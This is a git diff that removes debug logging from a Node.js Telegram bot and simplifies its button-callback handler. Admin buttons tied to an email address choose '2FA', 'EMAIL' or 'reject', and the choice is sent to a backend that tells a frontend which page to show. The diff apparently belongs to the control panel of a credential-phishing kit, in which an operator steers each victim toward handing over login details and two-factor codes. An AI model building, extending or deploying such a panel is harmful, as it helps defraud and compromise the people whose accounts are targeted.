@@ -21,73 +21,33 @@ const bot = new TelegramBot(BOT_TOKEN, {
   }
 });
 
-bot.getMe().then((me) => {
-  console.log(`\n${"=".repeat(60)}`);
-  console.log(`✅ BOT CONNECTED`);
-  console.log(`🤖 Bot Username: @${me.username}`);
-  console.log(`🤖 Bot ID: ${me.id}`);
-  console.log(`📍 Bot is listening for button clicks...`);
-  console.log(`${"=".repeat(60)}\n`);
+bot.getMe().then(() => {
+  console.log(`✅ Bot connected`);
 }).catch(err => {
   console.error("❌ Bot connection failed:", err.message);
 });
 
 // ============================================================================
-// 🔘 DEBUG: ALL MESSAGE TYPES
+// 🔘 CALLBACK HANDLERS
 // ============================================================================
 
-bot.on("message", (msg) => {
-  console.log(`\n💬 MESSAGE RECEIVED (DEBUG)`);
-  console.log(`   Type: ${msg.chat.type}`);
-  console.log(`   From: @${msg.from.username || msg.from.first_name}`);
-  console.log(`   Text: ${msg.text}`);
-});
+const handledCallbacks = new Set();
 
 bot.on("callback_query", async (query) => {
   const callbackId = query.id;
   
-  console.log(`\n${"=".repeat(60)}`);
-  console.log(`🔘🔘🔘 CALLBACK QUERY RECEIVED 🔘🔘🔘`);
-  console.log(`${"=".repeat(60)}`);
-  console.log(`   Callback ID: ${callbackId}`);
-  console.log(`   Data: "${query.data}"`);
-  console.log(`   From: @${query.from.username || query.from.first_name}`);
-  console.log(`   Message ID: ${query.message?.message_id}`);
-  console.log(`   Chat ID: ${query.message?.chat?.id}`);
-  
-  // Prevent duplicate processing
   if (handledCallbacks.has(callbackId)) {
-    console.log(`   ⚠️ DUPLICATE - IGNORING`);
     return;
   }
   handledCallbacks.add(callbackId);
-  console.log(`   ✅ Not a duplicate - processing...`);
 
   try {
-    console.log(`\n   🔍 PARSING DATA...`);
     const data = query.data;
-    console.log(`   Raw data: "${data}"`);
-    
-    const parts = data.split("|");
-    console.log(`   Split parts: [${parts[0]}, ${parts[1]}]`);
-    
-    const action = parts[0];
-    const email = parts[1];
-    
-    console.log(`   ✅ Parsed successfully!`);
-    console.log(`      Action: "${action}"`);
-    console.log(`      Email: "${email}"`);
+    const [action, email] = data.split("|");
 
-    if (!action || !email) {
-      console.log(`   ❌ ACTION or EMAIL is empty!`);
-      return;
-    }
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : "REJECT"}`);
 
-    console.log(`\n   📤 SENDING TO BACKEND...`);
-    console.log(`      URL: ${APP_URL}/update-status`);
-    console.log(`      Method: POST`);
-    console.log(`      Body: { email: "${email}", status: "${action}" }`);
-    
+    // Update status via backend
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -97,63 +57,38 @@ bot.on("callback_query", async (query) => {
       })
     });
 
-    console.log(`\n   📥 BACKEND RESPONSE...`);
-    console.log(`      Status Code: ${response.status}`);
-    console.log(`      Status Text: ${response.statusText}`);
-    
-    const responseBody = await response.json();
-    console.log(`      Body:`, responseBody);
-
     if (response.ok) {
-      console.log(`   ✅✅✅ BACKEND UPDATED SUCCESSFULLY!`);
-      console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
-      
       // ============================================================================
-      // 📝 STEP 1: EDIT ORIGINAL MESSAGE - REMOVE BUTTONS
+      // 📝 EDIT ORIGINAL MESSAGE - REMOVE BUTTONS
       // ============================================================================
-      
-      console.log(`\n   📝 STEP 1: REMOVING BUTTONS FROM ORIGINAL MESSAGE...`);
-      
+
       try {
-        const botToken = process.env.BOT_TOKEN;
-        const chatId = process.env.ADMIN_CHAT_ID;
+        const botToken = BOT_TOKEN;
+        const chatId = ADMIN_CHAT_ID;
         const messageId = query.message?.message_id;
         const originalText = query.message?.text;
         
-        if (!messageId || !originalText) {
-          console.error(`      ❌ No message ID or text found!`);
-          return;
-        }
-        
-        // Edit message to remove buttons (keep text only)
-        const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
-        const editResponse = await fetch(editUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            message_id: messageId,
-            text: originalText,
-            parse_mode: "HTML"
-            // No reply_markup = buttons removed!
-          })
-        });
-        
-        if (editResponse.ok) {
-          console.log(`      ✅ Buttons removed from original message!`);
-        } else {
-          console.error(`      ❌ Failed to edit message`);
+        if (messageId && originalText) {
+          const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              message_id: messageId,
+              text: originalText,
+              parse_mode: "HTML"
+            })
+          });
         }
       } catch (err) {
-        console.error(`      ❌ Error editing message:`, err.message);
+        console.error(`Error editing message:`, err.message);
       }
-      
+
       // ============================================================================
-      // 📢 STEP 2: SEND SEPARATE STATUS REPLY MESSAGE
+      // 📢 SEND STATUS REPLY MESSAGE
       // ============================================================================
-      
-      console.log(`\n   📢 STEP 2: SENDING STATUS REPLY MESSAGE...`);
-      
+
       let statusMessage = "";
       if (action === "page1") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
@@ -162,75 +97,41 @@ bot.on("callback_query", async (query) => {
       } else if (action === "reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
-      
+
       try {
-        const botToken = process.env.BOT_TOKEN;
-        const chatId = process.env.ADMIN_CHAT_ID;
-        const messageId = query.message?.message_id;
+        const botToken = BOT_TOKEN;
+        const chatId = ADMIN_CHAT_ID;
         
-        // Send as a normal message (not reply)
         const replyUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const replyResponse = await fetch(replyUrl, {
+        await fetch(replyUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
             text: statusMessage,
             parse_mode: "HTML"
-            // No reply_to_message_id = normal message!
           })
         });
-        
-        if (replyResponse.ok) {
-          console.log(`      ✅ Status reply sent!`);
-          console.log(`      Message: ${statusMessage}`);
-        } else {
-          console.error(`      ❌ Failed to send reply`);
-        }
       } catch (err) {
-        console.error(`      ❌ Error sending reply:`, err.message);
+        console.error(`Error sending status:`, err.message);
       }
     }
 
-    console.log(`\n   🔔 ANSWERING CALLBACK QUERY...`);
-    const answerText = `✅ ${action.toUpperCase()}`;
-    console.log(`      Text: ${answerText}`);
-    
-    await bot.answerCallbackQuery(callbackId, {
-      text: answerText,
+    // Acknowledge callback
+    bot.answerCallbackQuery(callbackId, {
+      text: `✅ ${action.toUpperCase()}`,
       show_alert: false
-    });
-    
-    console.log(`   ✅ Callback answered!`);
-    console.log(`${"=".repeat(60)}\n`);
+    }).catch(() => {});
 
   } catch (err) {
-    console.error(`\n   ❌❌❌ ERROR IN CALLBACK HANDLER!`);
-    console.error(`      Error: ${err.message}`);
-    console.error(`      Stack: ${err.stack}`);
-    
-    try {
-      await bot.answerCallbackQuery(query.id, {
-        text: "❌ Error processing request",
-        show_alert: true
-      });
-    } catch (e) {
-      console.error(`   ❌ Failed to answer callback:`, e.message);
-    }
+    console.error("❌ Callback error:", err.message);
+    bot.answerCallbackQuery(query.id, {
+      text: "❌ Error",
+      show_alert: true
+    }).catch(() => {});
   }
 });
 
-const handledCallbacks = new Set();
-
-bot.on("polling_error", (err) => {
-  console.error(`\n❌ POLLING ERROR:`);
-  console.error(`   Code: ${err.code}`);
-  console.error(`   Message: ${err.message}`);
-});
-
-console.log(`${"=".repeat(60)}`);
-console.log(`✅ BOT.JS READY - DEBUG MODE`);
-console.log(`📍 Waiting for button clicks...`);
-console.log(`${"=".repeat(60)}\n`);
+console.log(`✅ Bot ready`);
 
 module.exports = { bot };
